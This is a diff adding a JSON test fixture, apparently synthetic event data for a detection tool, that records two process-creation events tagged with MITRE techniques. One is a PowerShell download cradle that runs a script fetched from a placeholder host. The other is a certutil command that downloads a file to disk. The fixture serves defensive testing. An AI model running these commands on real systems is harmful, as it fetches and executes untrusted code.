@@ -1,0 +1,29 @@
+{
+  "id": "download-cradle",
+  "name": "PowerShell download cradle",
+  "description": "Cradle string only; no URL is contacted, the event is just a record.",
+  "events": [
+    {
+      "offset_ms": 0,
+      "category": "process_creation",
+      "technique": "T1059.001",
+      "fields": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://lab.invalid/a.ps1')\"",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "User": "LAB\\analyst"
+      }
+    },
+    {
+      "offset_ms": 900,
+      "category": "process_creation",
+      "technique": "T1105",
+      "fields": {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://lab.invalid/b.bin C:\\Users\\Public\\b.bin",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "LAB\\analyst"
+      }
+    }
+  ]
+}
